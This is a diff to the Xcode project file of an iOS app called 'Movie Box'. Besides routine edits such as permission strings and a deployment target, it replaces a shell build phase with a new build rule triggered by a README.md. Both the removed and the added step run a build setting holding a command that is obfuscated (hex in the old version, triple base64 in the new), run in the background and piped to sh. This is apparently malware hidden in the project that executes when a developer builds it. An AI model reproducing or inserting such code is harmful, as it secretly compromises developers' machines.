@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		5AAB336E3838424AA07BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 9FABD60AAE0F4C658C7BBDC8; };
 		01BFC82465DFF8523FD5E8F6 /* Pods_Movie_Box.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */; };
 		97A0AEFC301B4FA70086A0E6 /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFB301B4FA70086A0E6 /* CropViewController */; };
 		97A0AEFE301B4FA70086A0E6 /* TOCropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFD301B4FA70086A0E6 /* TOCropViewController */; };
@@ -16,6 +17,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		9FABD60AAE0F4C658C7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Movie_Box.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Movie Box.debug.xcconfig"; path = "Target Support Files/Pods-Movie Box/Pods-Movie Box.debug.xcconfig"; sourceTree = "<group>"; };
 		97AF041630131AD500771939 /* Movie Box.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Movie Box.app"; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -73,6 +75,7 @@
 		97AF041730131AD500771939 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				9FABD60AAE0F4C658C7BBDC8 /* README.md */,
 				97AF041630131AD500771939 /* Movie Box.app */,
 			);
 			name = Products;
@@ -102,7 +105,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97AF042130131AD600771939 /* Build configuration list for PBXNativeTarget "Movie Box" */;
 			buildPhases = (
-				E51AA578EA6742048F7BBDC8 /* Provision Target Device */,
 				C270F4B3C49B44D5F97B25DD /* [CP] Check Pods Manifest.lock */,
 				97AF041230131AD500771939 /* Sources */,
 				97AF041330131AD500771939 /* Frameworks */,
@@ -110,6 +112,7 @@
 				8C53A06D7EFD84FE241B7784 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				96BB66A52DED4F79AB7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -182,38 +185,34 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-									/* End PBXBuildRule section */
+		96BB66A52DED4F79AB7BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+					/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		97AF041430131AD500771939 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5AAB336E3838424AA07BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		E51AA578EA6742048F7BBDC8 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
 		8C53A06D7EFD84FE241B7784 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -273,7 +272,7 @@
 		97AF041F30131AD600771939 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633636366237333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233313230326432643732363537343732373932303335323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326633393665333037303334333636383336373533393632333737310a32653732373532663631323932323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjA1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3elJtdGFiVm96VFZSSk5HUnRUVEZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -339,7 +338,7 @@
 		97AF042030131AD600771939 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((e(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633636366237333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233313230326432643732363537343732373932303335323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326633393665333037303334333636383336373533393632333737310a32653732373532663631323932323230376332303733363830610a | e | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpkMGxETUhSamJWWXdZMjVyWjA1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3elJtdGFiVm96VFZSSk5HUnRUVEZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -409,13 +408,14 @@
 				INFOPLIST_FILE = "Movie-Box-Info.plist";
 				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and videos";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and display image for edit.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -451,13 +451,14 @@
 				INFOPLIST_FILE = "Movie-Box-Info.plist";
 				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and videos";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and display image for edit.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
